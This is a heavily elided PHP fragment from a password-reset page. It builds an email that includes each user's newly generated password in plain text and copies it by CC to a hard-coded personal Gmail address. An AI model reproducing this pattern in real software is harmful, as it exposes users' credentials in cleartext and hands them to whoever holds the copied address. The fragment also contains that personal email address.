...
require 'phpmailer/src/SMTP.php';
 ...
 if (isset($_POST['generatePassword'])) {
	...
	if (($selectedEmail) == ($loginEmail)) {
		...
		//Set CC address
		$mail->addCC("klenidychathurarya@gmail.com");
		...
		$msg .= "<b>Subject:</b> {$_POST["role"]} <br>";
		$msg .= "<b>New Password:</b> {$kc} <br>";
...
<body>
	...
	<div class="d-lg-flex half">
		...
		<div class="bg order-1 order-md-2" style="background-image: url('loginMain/images/forgot-password-concept-isolated-white_263070-194.webp');"></div>
